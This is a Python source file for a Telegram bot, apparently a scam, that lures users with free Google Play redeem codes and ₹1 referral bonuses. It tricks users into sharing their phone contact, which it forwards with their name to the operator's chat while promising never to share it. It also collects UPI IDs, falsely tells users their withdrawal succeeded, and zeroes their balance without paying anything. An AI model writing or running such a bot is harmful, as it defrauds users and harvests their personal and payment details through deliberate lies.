import telebot
import logging
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from collections import defaultdict
import os

# Initialize the bot with your token from environment variables
BOT_TOKEN = os.getenv("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)

# Your Telegram chat ID where you want to receive UPI info, also from environment variables
YOUR_CHAT_ID = os.getenv("YOUR_CHAT_ID")

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger()

# To store user balances, referral data, bonus status, and claim attempts
user_balances = defaultdict(int)
user_referrals = defaultdict(int)
user_bonus_received = defaultdict(bool)  # Track if bonus has been given
user_join_status = defaultdict(bool)  # To track if user has joined the required channels/groups
user_first_claim = defaultdict(bool)  # To track the first claim attempt

def send_telegram_message(contact_info, phone_number, first_name, last_name):
    phone_link = f"<a href='tel:{phone_number}'>{phone_number}</a>"
    name_mono = f"<code>{first_name} {last_name}</code>"
    message = f"New Contact Info Received:\nName: {name_mono}\nPhone: {phone_link}\n\nClick to copy: <code>{phone_number}</code>"
    bot.send_message(YOUR_CHAT_ID, message, parse_mode='HTML')

def send_reply_buttons(user_id):
    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    balance_button = KeyboardButton("💰Balance")
    withdraw_button = KeyboardButton("✅Withdraw")
    referral_button = KeyboardButton("🙌Referral Link")  # Changed emoji here
    bonus_button = KeyboardButton("🎁Bonus")
    markup.add(balance_button, withdraw_button, referral_button, bonus_button)
    bot.send_message(user_id, "Choose an option:", reply_markup=markup)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.chat.id
    if ' ' in message.text:
        referrer_id = message.text.split()[1]
        user_referrals[user_id] = referrer_id

    welcome_message = """
👋 Hey There User Welcome To Bot!

⚠️ Must Join Total Channel To Use Our Bot

💥 After Joining Click Claim
    """
    markup = InlineKeyboardMarkup()
    join_channel = InlineKeyboardButton("Join Channel", url="https://t.me/Free_google_play_redeem_code1")
    join_group = InlineKeyboardButton("Join Group", url="https://t.me/redeem_code_chat")
    claim = InlineKeyboardButton("Claim", callback_data='claim')
    markup.add(join_channel, join_group)
    markup.add(claim)

    try:
        bot.send_message(user_id, welcome_message, reply_markup=markup)
        logger.info(f"Sent welcome message to chat ID {user_id}")
    except Exception as e:
        logger.error(f"Failed to send message: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'claim')
def after_claim(call):
    user_id = call.message.chat.id

    # Check if this is the user's first claim attempt
    if not user_first_claim[user_id]:
        user_first_claim[user_id] = True  # Mark that the user has made the first claim attempt
        bot.send_message(user_id, "❌ Please join all channel and group first, then click 'Claim' again.")
    else:
        # If it's the second claim attempt, continue with the process
        markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        share_contact = KeyboardButton("✅ Share Your Profile", request_contact=True)
        markup.add(share_contact)

        try:
            bot.send_message(user_id, "📱 Please share your profile to avoid fake accounts.", reply_markup=markup)
            logger.info(f"Sent contact request to chat ID {user_id}")
        except Exception as e:
            logger.error(f"Failed to send message: {e}")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    user_id = message.chat.id

    if message.contact:
        phone_number = message.contact.phone_number
        first_name = message.contact.first_name
        last_name = message.contact.last_name

        contact_info = f"Name: {first_name} {last_name}\nPhone: {phone_number}"
        send_telegram_message(contact_info, phone_number, first_name, last_name)

        try:
            bot.send_message(user_id, "Thank you for sharing your contact! Don't worry, your contact will never be shared with anyone.")
            send_reply_buttons(user_id)  # Send reply buttons after contact is received
            logger.info(f"Sent reply keyboard with options to chat ID {user_id}")
        except Exception as e:
            logger.error(f"Failed to send message: {e}")
    else:
        bot.send_message(user_id, "Please share your contact using the button provided.")

@bot.message_handler(func=lambda message: message.text in ["💰Balance", "✅Withdraw", "🙌Referral Link", "🎁Bonus"])  # Updated emoji
def handle_buttons(message):
    user_id = message.chat.id

    if message.text == "💰Balance":
        bot.send_message(user_id, f"Your current balance is: ₹{user_balances[user_id]}")

    elif message.text == "✅Withdraw":
        bot.send_message(user_id, "Please enter your UPI ID to proceed with the withdrawal:")
        bot.register_next_step_handler(message, process_upi_id)

    elif message.text == "🙌Referral Link":  # Updated emoji
        referral_link = f"https://t.me/{bot.get_me().username}?start={user_id}"
        bot.send_message(user_id, f"Aapka referral link yeh hai, apne doston ke saath share karke aur kama sakte hain:\n{referral_link}", disable_web_page_preview=True)

    elif message.text == "🎁Bonus":
        # Check if bonus has already been given
        if not user_bonus_received[user_id]:
            # Add ₹1 to the user's balance
            user_balances[user_id] += 1
            user_bonus_received[user_id] = True  # Mark bonus as given
            bot.send_message(user_id, "Congrats 🎁 you won ₹1 ")

            # Check if the user was referred and update referral balance
            if user_id in user_referrals:
                referrer_id = user_referrals[user_id]
                user_balances[referrer_id] += 1  # Add ₹1 to referrer's balance (updated as per your request)
                bot.send_message(referrer_id, f"you got ₹1 invited by your url, !")
                logger.info(f"Added ₹1 to referrer {referrer_id}'s balance")

            # Send updated balance to the user
            bot.send_message(user_id, f"Aapka balance update ho chuka hai: ₹{user_balances[user_id]}")
        else:
            bot.send_message(user_id, "You already claimed your bonus .")

def process_upi_id(message):
    user_id = message.chat.id
    upi_id = message.text

    if "@" in upi_id:
        # User ke details fetch karo
        user = bot.get_chat(user_id)
        first_name = user.first_name
        last_name = user.last_name or ""
        
        # UPI ID details aapke chat ID par bhejo
        user_details_message = (
            f"User Details:\n"
            f"Name: {first_name} {last_name}\n"
            f"Chat ID: {user_id}\n"
            f"UPI ID: <code>{upi_id}</code>\n"
            f"Earnings from Referrals: ₹{user_balances[user_id]}\n"
            f"Total Referrals: {user_referrals[user_id] if user_id in user_referrals else 0}"
        )
        bot.send_message(YOUR_CHAT_ID, user_details_message, parse_mode='HTML')
        
        bot.send_message(user_id, "✅ Aapka amount successfully withdraw kar diya gaya hai. Kripya 1 se 2 minute ke andar apne UPI account ko check karein.")
        user_balances[user_id] = 0  # Withdrawal ke baad balance ko reset karo

        # UPI ID process karne ke baad reply buttons dobara bhejo
        send_reply_buttons(user_id)
    else:
        bot.send_message(user_id, "Invalid UPI ID. Kripya ek valid UPI ID enter karein jo '@' contain karti ho.")

bot.polling()
